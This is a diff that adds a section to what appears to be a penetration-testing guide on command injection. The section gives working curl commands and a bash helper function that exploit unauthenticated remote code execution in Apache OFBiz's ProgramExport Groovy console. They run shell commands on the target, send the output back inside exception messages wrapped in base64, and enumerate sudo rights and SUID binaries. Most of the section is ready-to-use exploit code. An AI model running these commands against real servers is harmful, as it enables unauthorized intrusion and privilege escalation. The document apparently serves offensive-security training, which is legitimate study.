@@ -317,6 +317,45 @@ Write output to a web-accessible file:
 curl http://TARGET/output.txt
 ```
 
+### Single-Value Return Channel (RCE via Exception Message / API Field)
+
+Some RCE primitives give you neither a shell nor raw stdout — the only
+channel back is a single string the application already returns: a stack
+trace or exception message, an `error` field in a JSON response, or a
+"result" field from an exposed scripting console (Groovy consoles, admin
+script runners, `eval`-style debug endpoints). Multi-line command output
+breaks this channel — newlines get collapsed, the message gets truncated at
+the first line, or your own extraction regex chokes on embedded quotes.
+
+**Lab-verified pattern (Apache OFBiz `webtools/control/ProgramExport` Groovy
+console, unauthenticated RCE via `groovyProgram=`):**
+
+```bash
+# 1 — naive: throw the raw output as the exception message
+#     (fine for a single-line probe, breaks on anything with newlines)
+curl -sk "https://TARGET:8443/webtools/control/ProgramExport;jsessionid=x?USERNAME=&PASSWORD=&requirePasswordChange=Y" \
+  -H "Host: HOSTNAME" \
+  --data-urlencode 'groovyProgram=throw new Exception(["bash","-c","id"].execute().text)' \
+  | grep -oP 'Exception: .*'
+
+# 2 — base64-wrap the output inside the payload itself, decode locally.
+#     Go straight to this form once step 1 confirms the primitive fires —
+#     don't iterate through plain-text/regex extraction first, it's fragile
+#     against anything with newlines, quotes, or your own grep pattern in it.
+groovy_exec() {
+  local cmd="$1"
+  curl -sk "https://TARGET:8443/webtools/control/ProgramExport;jsessionid=x?USERNAME=&PASSWORD=&requirePasswordChange=Y" \
+    -H "Host: HOSTNAME" \
+    --data-urlencode "groovyProgram=throw new Exception(([\"bash\",\"-c\",\"$cmd 2>&1 | base64 -w0\"].execute().text))" \
+    | grep -oP 'Exception: [A-Za-z0-9+/=]+' | sed 's/Exception: //' | base64 -d
+}
+groovy_exec "sudo -l; find / -perm -4000 -type f 2>/dev/null"
+```
+
+This generalizes to any single-value-return RCE channel, not just Groovy or
+OFBiz — the fix is always "base64 the output before it enters the return
+value, decode on your side," not a smarter regex.
+
 ## Step 5: Argument Injection
 
 When shell metacharacters (`;`, `|`, etc.) are properly escaped but the input is
